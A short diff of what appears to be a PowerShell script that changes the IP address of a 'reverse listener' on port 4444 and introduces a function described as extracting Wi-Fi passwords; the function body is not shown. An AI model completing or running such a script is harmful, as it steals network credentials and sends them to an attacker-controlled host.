@@ -1,6 +1,6 @@
 
 # Define the target IP and port for the reverse listener
-$targetIP = "192.168.0.97"
+$targetIP = "192.168.0.112"
 $targetPort = 4444
 
 # Function to extract Wi-Fi passwords
